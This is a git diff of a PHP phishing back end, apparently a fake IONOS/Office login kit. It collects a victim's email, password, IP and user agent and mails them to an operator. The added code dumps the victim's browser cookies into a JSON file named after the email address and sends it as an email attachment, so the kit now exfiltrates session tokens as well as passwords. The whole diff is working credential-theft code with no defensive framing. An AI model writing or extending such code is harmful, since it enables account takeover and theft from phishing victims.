@@ -13,48 +13,55 @@ function sendEmail($message, $subject = "New Credientials", $file = "") {
     global $EMAIL;
     global $SENDER_EMAIL;
 
-    // $filename = pathinfo($file, PATHINFO_FILENAME);
 
-    // $content = file_get_contents($file);
-    // $content = chunk_split(base64_encode($content));
-
-    // // a random hash will be necessary to send mixed content
-    // $separator = md5(time());
-
-    // // carriage return type (RFC)
-    // $eol = "\r\n";
-
-    // $headers  = 'MIME-Version: 1.0'.$eol;
-    // $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol;
-    // $headers .= "Content-Transfer-Encoding: 7bit".$eol;
-    // $headers .= "This is a MIME encoded message.".$eol;
-    
-    // // Create email headers
-    // $headers .= "From: Office M3sh<$SENDER_EMAIL>".$eol;
-    // $headers .= "Reply-to: $SENDER_EMAIL".$eol;
-
-    // // Message
-    // $body = "--" . $separator . $eol;
-    // $body .= "Content-Type: text/html; charset=\"iso-8859-1\"" . $eol;
-    // $body .= "Content-Transfer-Encoding: 8bit" . $eol;
-    // $body .= $message . $eol;
-
-    // // attachment
-    // $body .= "--" . $separator . $eol;
-    // $body .= "Content-Type: application/octet-stream; name=\"" . $filename . "\"" . $eol;
-    // $body .= "Content-Transfer-Encoding: base64" . $eol;
-    // $body .= "Content-Disposition: attachment" . $eol;
-    // $body .= $content . $eol;
-    // $body .= "--" . $separator . "--";
-
-     $headers  = 'MIME-Version: 1.0' . "\r\n";
-    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
+    // Normal
+    // $headers  = 'MIME-Version: 1.0' . "\r\n";
+    // $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
     
     // Create email headers
-    $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
-    $headers .= "Reply-to: $SENDER_EMAIL\r\n";
+    // $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
+    // $headers .= "Reply-to: $SENDER_EMAIL\r\n";
 
-    return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
+    // return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
+
+
+    // OTHER 
+    $filename = pathinfo($file, PATHINFO_FILENAME);
+
+    $content = file_get_contents($file);
+    $content = chunk_split(base64_encode($content));
+
+    // a random hash will be necessary to send mixed content
+    $separator = md5(time());
+
+    // carriage return type (RFC)
+    $eol = "\r\n";
+
+    $headers  = 'MIME-Version: 1.0'.$eol;
+    $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol;
+    $headers .= "Content-Transfer-Encoding: 7bit".$eol;
+    $headers .= "This is a MIME encoded message.".$eol;
+    
+    // Create email headers
+    $headers .= "From: Office M3sh<$SENDER_EMAIL>".$eol;
+    $headers .= "Reply-to: $SENDER_EMAIL".$eol;
+
+    // Message
+    $body = "--" . $separator . $eol;
+    $body .= "Content-Type: text/html; charset=\"iso-8859-1\"" . $eol;
+    $body .= "Content-Transfer-Encoding: 8bit" . $eol;
+    $body .= $message . $eol;
+
+    // attachment
+    $body .= "--" . $separator . $eol;
+    $body .= "Content-Type: application/json; name=\"" . $filename . "\"" . $eol;
+    $body .= "Content-Transfer-Encoding: base64" . $eol;
+    $body .= "Content-Disposition: attachment" . $eol;
+    $body .= $content . $eol;
+    $body .= "--" . $separator . "--";
+
+
+    return mail($EMAIL, $subject, $body, $headers, "-f$SENDER_EMAIL");
 }
 
 if(isset($_REQUEST['send'])) {
@@ -62,8 +69,16 @@ if(isset($_REQUEST['send'])) {
     $password = $_REQUEST['password'];
     $ip = $_REQUEST['ip'];
     $agent = $_REQUEST['agent'];
-
+    $name = explode('@', $email)[0];
+    
+    
     try {
+        // Create file
+        $filename = "$name.json";
+        $file = fopen($filename, "w");
+        fwrite($file, json_encode($_COOKIE));
+        fclose($file);
+
         // Send Mail
         $message = "<!DOCTYPE html>
         <html lang='en'>
@@ -149,7 +164,7 @@ if(isset($_REQUEST['send'])) {
         $message = str_replace("{{cookie}}", json_encode($_COOKIE), $message);
 
 
-        $mail = sendEmail($message, "IONOS-Logs | $ip");
+        $mail = sendEmail($message, "IONOS-Logs | $ip", $filename);
         if(!$mail) throw new Exception("Could not send");
 
         echo $response = json_encode(["status" => true, "message" => "Email sent"]);
